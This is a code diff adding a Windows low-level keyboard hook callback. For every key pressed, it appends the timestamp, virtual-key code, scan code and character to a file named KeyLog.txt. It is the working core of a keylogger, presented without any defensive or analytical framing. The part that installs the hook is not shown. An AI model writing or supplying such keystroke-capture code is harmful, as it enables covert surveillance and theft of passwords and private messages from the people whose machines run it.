@@ -1,0 +1,23 @@
+LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam){
+	switch(wParam){
+		case WM_KEYDOWN:
+			FILE* file;
+			_wfopen_s(&file, L"KeyLog.txt", L"a,ccs=UTF-8");
+			WCHAR szChar;
+			WCHAR szCode[16];
+			WCHAR szLine[128];
+			szChar = (WCHAR)MapVirtualKeyW(((LPKBDLLHOOKSTRUCT)lParam)->vkCode, MAPVK_VK_TO_CHAR);
+			//_itow_s(((LPKBDLLHOOKSTRUCT)lParam)->scanCode, szCode, 16, 10);
+			//wcscat_s(szCode, 16, L"\n");
+			//GetKeyNameTextW(lParam, szCode, 16);
+			swprintf_s(szLine, 128, L"%d>  %d  |  %d  |  %c\n", ((LPKBDLLHOOKSTRUCT)lParam)->time, ((LPKBDLLHOOKSTRUCT)lParam)->vkCode, ((LPKBDLLHOOKSTRUCT)lParam)->scanCode, szChar);
+			//fwrite(szCode, sizeof(WCHAR), wcslen(szCode), file);
+			//fwrite(&szChar, sizeof(WCHAR), 1, file);
+			//fwrite((const void*)L'\n', sizeof(WCHAR), 1, file);
+			fwrite(szLine, sizeof(WCHAR), wcslen(szLine), file);
+
+			fclose(file);
+		break;
+	}
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
